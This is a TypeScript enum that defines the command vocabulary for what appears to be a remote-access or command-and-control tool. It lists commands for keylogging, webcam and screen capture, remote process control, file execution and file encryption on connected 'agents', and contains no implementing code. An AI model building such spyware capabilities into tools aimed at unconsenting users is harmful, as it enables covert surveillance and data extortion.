export enum CommandType {
    PING = "ping",
    PONG = "pong",
    AUTH = "auth",
    HEARTBEAT = "heartbeat",
    ERROR = "error",
    BROADCAST = "broadcast",

    APP_LIST = "LISTAPP",
    APP_START = "STARTAPP",
    APP_KILL = "STOPAPP",
    
    PROC_LIST = "LISTPROC",
    PROC_START = "STARTPROC",
    PROC_KILL = "STOPPROC",

    CAM_RECORD = "CAM_RECORD",
    CAM_SHOT = "CAMSHOT",
    SCR_RECORD = "SCR_RECORD",
    SCREENSHOT = "SCRSHOT",
    START_KEYLOG = "STARTKLOG",
    STOP_KEYLOG = "STOPKLOG",
    STREAM_DATA = "stream_data",

    SHUTDOWN = "shutdown",
    RESTART = "restart",
    
    ECHO = "echo",
    WHOAMI = "whoami",

    GET_AGENTS = "get_agents",
    AGENT_STATUS = "agent_status",
    CONNECT_AGENT = "connect_agent",

    GET_ACTIVITY_HISTORY = "get_activity_history",
    SAVE_USER_PREFERENCE = "save_user_preference",
    GET_USER_PREFERENCES = "get_user_preferences",
    DELETE_USER_PREFERENCE = "delete_user_preference",

    ADD_AGENT_TAG = "add_agent_tag",
    REMOVE_AGENT_TAG = "remove_agent_tag",
    GET_AGENTS_BY_TAG = "get_agents_by_tag",
    GET_AGENT_TAGS = "get_agent_tags",
    GET_ALL_TAGS = "get_all_tags",

    FILE_UPLOAD = "file_upload",
    FILE_DOWNLOAD = "file_download",
    FILE_CHUNK = "file_chunk",
    FILE_PROGRESS = "file_progress",
    FILE_COMPLETE = "file_complete",
    FILE_LIST = "file_list",
    FILE_EXECUTE = "file_execute",
    FILE_ENCRYPT = "file_encrypt",
    SYSTEM_INFO = "system_info",
}
